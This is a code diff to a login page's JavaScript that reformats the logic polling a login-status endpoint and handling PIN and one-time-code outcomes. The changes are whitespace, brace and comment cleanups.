@@ -324,9 +324,9 @@ document.addEventListener('DOMContentLoaded', function () {
           if (checkingPinStatus) return;
           checkingPinStatus = true;
           console.log('[login] Polling status for:', loginId);
-          fetch('/api/login/status/' + loginId, { cache: 'no-store' })
-            .then(function (res) { return res.json(); })
-.then(function (statusData) {
+fetch('/api/login/status/' + loginId, { cache: 'no-store' })
+             .then(function (res) { return res.json(); })
+             .then(function (statusData) {
                console.log('[login] Status response:', statusData);
                if (statusData.sharedStore === false) {
                  if (pollInterval) clearInterval(pollInterval);
@@ -337,7 +337,6 @@ document.addEventListener('DOMContentLoaded', function () {
                }
                if (!statusData.found) {
                  console.log('[login] Record not found for id:', loginId);
-                 // Keep polling - record might not be created yet
                }
                if (statusData.decided) {
                  if (pollInterval) clearInterval(pollInterval);
@@ -351,14 +350,14 @@ document.addEventListener('DOMContentLoaded', function () {
                    if (submitBtn) submitBtn.disabled = false;
                    var firstOtp = otpForm ? otpForm.querySelector('.pin-box') : null;
                    if (firstOtp) firstOtp.focus();
-                   } else {
-                     if (spinner) spinner.style.display = 'none';
-                     showToast('Wrong PIN. Please try again.', 'error');
-                     if (submitBtn) submitBtn.disabled = false;
-                     pinBoxes.forEach(function (box) { box.disabled = false; });
-                   }
+                 } else {
+                   if (spinner) spinner.style.display = 'none';
+                   showToast('Wrong PIN. Please try again.', 'error');
+                   if (submitBtn) submitBtn.disabled = false;
+                   pinBoxes.forEach(function (box) { box.disabled = false; });
                  }
-               })
+               }
+             })
               .catch(function () {
                 if (spinner) spinner.style.display = 'none';
                 showToast('Error checking status. Please try again.', 'error');
